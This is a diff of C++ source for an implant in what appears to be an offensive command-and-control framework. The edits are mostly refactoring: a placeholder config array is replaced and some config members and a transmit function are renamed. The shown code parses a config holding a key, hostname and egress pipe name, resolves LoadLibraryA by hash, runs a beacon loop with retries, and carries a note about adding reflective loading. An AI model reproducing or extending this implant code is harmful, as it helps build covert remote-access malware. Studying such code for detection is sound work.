@@ -1,10 +1,6 @@
 #include <core/include/implant.hpp>
 namespace Implant {
 
-    TXT_SECTION(F) BYTE Config[1024] = {
-        0x41,0x41,0x41,0x41, 0x41,0x41,0x41,0x41,
-    };
-
     VOID MainRoutine() {
         HEXANE
 
@@ -22,7 +18,7 @@ namespace Implant {
                 }
             }
 
-            Message::MessageTransmit();
+            Dispatcher::MessageTransmit();
 
             if (ntstatus != ERROR_SUCCESS) {
                 Ctx->Session.Retry++;
@@ -42,14 +38,14 @@ namespace Implant {
         HEXANE
 
         _parser parser = { };
-        Parser::CreateParser(&parser, Config, sizeof(Config));
-        x_memset(Config, 0, sizeof(Config));
+        Parser::CreateParser(&parser, __config, sizeof(__config));
+        x_memset(__config, 0, sizeof(__config));
 
         Parser::ParserBytecpy(&parser, R_CAST(PBYTE, &Ctx->Root));
         Parser::ParserMemcpy(&parser, &Ctx->Config.Key, nullptr);
         Parser::ParserStrcpy(&parser, &Ctx->Config.Hostname, nullptr);
 
-        //Xtea::XteaCrypt(S_CAST(PBYTE, Parser.Buffer), Parser.Length - 0x12, Ctx->Config.Key, FALSE);
+        //Xtea::XteaCrypt(S_CAST(PBYTE, Parser.Buffer), Parser.Length - 0x12, Ctx->config.Key, FALSE);
         // todo: add reflective loading? maybe https://github.com/bats3c/DarkLoadLibrary
 
         if ((F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
@@ -147,7 +143,7 @@ namespace Implant {
         }
 #endif
 #ifdef TRANSPORT_PIPE
-        Parser::ParserWcscpy(&parser, &Ctx->Config.EgressPipename, nullptr);
+        Parser::ParserWcscpy(&parser, &Ctx->config.EgressPipename, nullptr);
 #endif
     defer:
         Parser::DestroyParser(&parser);
@@ -161,4 +157,3 @@ VOID Entrypoint(HMODULE Base) {
     NT_ASSERT(Implant::ReadConfig());
     Implant::MainRoutine();
 }
-
